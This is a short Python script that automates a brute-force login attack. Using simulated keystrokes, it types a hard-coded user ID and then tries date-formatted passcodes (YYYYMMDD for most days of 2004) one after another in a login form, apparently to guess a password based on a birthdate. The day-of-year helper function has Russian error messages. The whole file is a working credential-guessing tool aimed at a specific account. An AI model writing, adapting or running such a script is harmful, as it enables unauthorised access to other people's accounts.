import keyboard as kb
import time
userid = ('aa18108530')
number = 135
time.sleep(5)
def iteration (passcode):
    time.sleep(3)
    kb.press_and_release('tab')
    kb.write(userid)
    kb.press_and_release('tab')
    kb.write(passcode)
    kb.press_and_release('enter')
def Finddate(DAY, YEAR):
    DAY = int(DAY)
    YEAR = float(YEAR)

    if (YEAR//400 == YEAR/400): 
        Y=1

    elif (YEAR//4 == YEAR/4) and (YEAR//100 != YEAR/100): 
        Y=1

    else:
        Y=0

        
    MONTH_LEN   = [31,28,31,30,31,30,31,31,30,31,30,31] 

    if Y==0:
        MONTH_LEN=MONTH_LEN

    else: 
        MONTH_LEN[1]+=1

    if Y == 0 and (DAY > 365 or DAY < 1):
        import sys
        sys.exit(str(int(YEAR))+" Не високосный год. Значение дня больше 365 или меньше 1")

    if Y == 1 and (DAY > 366 or DAY < 1):
        import sys
        sys.exit(str(int(YEAR))+" Високосный год. Значение дня больше 366 или меньше 1")

    for N, M in enumerate(MONTH_LEN):
        if DAY > M:
            DAY = DAY-M
        else:
            M_NUM = N+1
            break

    if len(str(DAY)) == 1:
        DAY = '0' + str(DAY)
    else:
        DAY = str(DAY)

    if len(str(M_NUM)) == 1:
        M_NUM = '0' + str(M_NUM)
    else:
        M_NUM = str(M_NUM)

    return str(int(YEAR)) + M_NUM + DAY
while number < 367 : 
    date = Finddate(number,2004)
    print(date)
    iteration(date)
    number = number + 1

